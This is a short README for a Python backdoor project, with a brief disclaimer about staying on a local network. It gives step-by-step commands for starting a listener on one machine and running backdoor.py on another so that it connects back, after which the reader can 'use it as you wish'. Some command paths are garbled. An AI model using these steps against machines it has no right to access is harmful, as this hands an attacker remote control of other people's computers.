First of all, hello everyone, you can operate with two computers connected to the same network as the project here.
I do not install it as it may go outside the legal framework you need to do on external networks.
How to use?
1-) First, visit the IP address you will use as a listener.
2-) To test backdoor_listener.py from the command client via Python, copy the directory where the python is installed.
3-) For example: C: \ "" "" \ "" "" \ py.exe backdoor_listener.py -i "ipaddress" -p "the desired port"
4-) Going where the Backdoor will be operated and in the same way
5-) Example: C: \ "" "" \ "" "" "\ py.exe backdoor.py -i "previousip" -p "previousiport"
6-) Connection is completed, now you can use it as you wish.
